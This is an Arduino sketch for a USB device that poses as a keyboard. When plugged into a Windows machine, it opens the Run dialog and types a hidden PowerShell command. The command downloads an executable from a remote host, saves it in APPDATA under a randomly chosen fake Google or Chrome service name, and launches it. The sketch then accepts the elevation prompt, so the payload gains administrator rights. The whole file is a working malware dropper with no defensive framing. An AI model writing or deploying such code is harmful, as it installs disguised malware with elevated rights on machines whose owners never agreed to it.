
#include <Keyboard.h>
#include "AltCoder.h"

#define STUB_ENDPOINT "https://d3usw4are.local/container/stub.dsc"
const char* STUB_DEPLOY_NAMES[] = {
  "GoogleService",
  "GoogleAccountManager",
  "ChromeCastService",
  "GoogleUpdate",
  "GoogleSyncManager",
  "ChromeUpdater",
  "ChromeAutoUpdate",
  "ChromeBackupService",
  "GoogleAccountService",
  "GoogleAutoUpdate"
};

void setup(){
  randomSeed(analogRead(A0));
  Keyboard.begin();
  delay(2000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  
  writeAltCode("powershell -W H -C \"$o=\\\"$env:APPDATA/");
  writeAltCode(STUB_DEPLOY_NAMES[random(0, 9)]);
  writeAltCode(".exe\\\";$d=New-Object System.Net.WebClient;$d.DownloadFile('");
  writeAltCode(STUB_ENDPOINT);
  writeAltCode("',$o);start -F $o\"");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  
  Keyboard.write(KEY_LEFT_ARROW);
  Keyboard.write(KEY_RETURN);
}
void loop(){}
